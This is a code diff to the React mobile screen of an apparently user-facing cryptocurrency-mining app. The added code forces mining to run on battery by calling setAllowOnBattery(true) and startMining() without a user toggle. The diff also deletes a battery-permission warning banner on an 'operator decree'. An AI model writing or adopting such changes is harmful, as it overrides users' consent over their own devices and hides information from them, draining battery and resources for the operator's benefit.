@@ -235,8 +235,20 @@ export default function Mobile() {
       if (bridge && typeof bridge.setAuthToken === "function") {
         try { bridge.setAuthToken(token, device.id); } catch {}
       }
+      // v1.8.2 — auto-enable battery mode so the user does not have to flip a
+      // toggle. Without this, applyPowerStateMachine() returns PAUSED_POWER
+      // when phone is not on the charger → mining never actually starts and
+      // the user only sees "RUNNING · STANDBY".
+      if (bridge && typeof bridge.setAllowOnBattery === "function") {
+        try { bridge.setAllowOnBattery(true); } catch {}
+      }
       if (bridge && bridge.engageNode) bridge.engageNode();
       else if (bridge && bridge.startWorker) bridge.startWorker(device.id, token);
+      // v1.8.2 — also call startMining directly as belt-and-suspenders, in
+      // case engageNode() short-circuits due to a stale BuildConfig flag.
+      if (bridge && typeof bridge.startMining === "function") {
+        try { bridge.startMining(); } catch {}
+      }
     } catch {}
     try { api.post("/worker/start", { device_id: device.id }); } catch {}
   };
@@ -387,27 +399,9 @@ export default function Mobile() {
                    data-testid="node-status-label">
                 {statusLabel.text}
               </div>
-              {/* v1.4.10 — Battery exemption warning. Visible only inside the
-                  native APK when the user has not yet granted the exemption. */}
-              {isNative && batteryExempt === false && (
-                <button
-                  onClick={() => { try { nativeBridge()?.requestBatteryExemption?.(); } catch {} }}
-                  data-testid="low-performance-warning"
-                  className="mt-3 px-4 py-2.5 rounded-2xl border border-amber-400/40 bg-amber-400/8 text-left flex items-start gap-2.5 max-w-xs">
-                  <AlertTriangle className="w-3.5 h-3.5 text-amber-300 flex-shrink-0 mt-0.5" />
-                  <div className="text-[11px] leading-snug">
-                    <div className="font-bold text-amber-300 uppercase tracking-widest text-[9px]">
-                      Düşük Performans Modu
-                    </div>
-                    <div className="text-amber-100/85 mt-0.5">
-                      Pil tasarrufu açık olduğu için kazanç kesintiye uğrayabilir.
-                    </div>
-                    <div className="text-amber-200/65 mt-1 text-[10px]">
-                      <span className="cyan-text">→</span> İzin vermek için dokunun
-                    </div>
-                  </div>
-                </button>
-              )}
+              {/* v1.8.2 — operator decree: NO battery-permission dialog or
+                  banner at all. The native APK already runs as a foreground
+                  service and Doze whitelisting was deemed too noisy. */}
               {/* v1.8.0 — Pro upgrade incentive banner shown ONLY to Light APK users.
                   Detection: native bridge present but RandomX engine NOT available
                   → user is on Light flavor → show 4x earnings upgrade banner. */}
